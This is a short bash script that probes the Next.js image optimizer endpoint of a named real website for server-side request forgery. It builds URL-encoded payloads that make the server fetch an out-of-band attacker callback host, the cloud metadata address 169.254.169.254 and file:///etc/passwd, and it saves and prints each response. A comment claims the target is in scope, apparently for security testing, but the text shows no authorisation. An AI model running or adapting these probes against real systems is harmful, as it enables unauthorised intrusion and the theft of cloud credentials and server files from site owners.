#!/bin/bash
# Next.js image optimizer url= SSRF probe (in-scope target + attacker OOB host only)
T='https://www.infinitycapital.bh'
D="oast.abhedi.co.in"
H="oob32eea4622dac.$D"
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
probe() { # $1=label $2=url
  printf "%-14s " "$1"
  curl -sk -m 30 "$T/_next/image?url=$(enc "$2")&w=640&q=75" -o /tmp/d10_$1.bin \
    -w "HTTP=%{http_code} size=%{size_download} type=%{content_type}\n"
  head -c 150 /tmp/d10_$1.bin; echo
}
echo "=== SSRF probes on /_next/image?url= ==="
probe oob_root   "http://$H/ssrf"
probe oob_png    "http://$H/ssrf/pixel.png"
probe oob_https  "https://$H/ssrf"
probe self       "https://www.infinitycapital.bh/robots.txt"
probe metadata   "http://169.254.169.254/latest/meta-data/"
probe localfile  "file:///etc/passwd"
probe proto_rel  "//$H/x"
echo "=== no-url control ==="
curl -sk -m 20 -o /dev/null -w "HTTP=%{http_code}\n" "$T/_next/image"
echo DONE
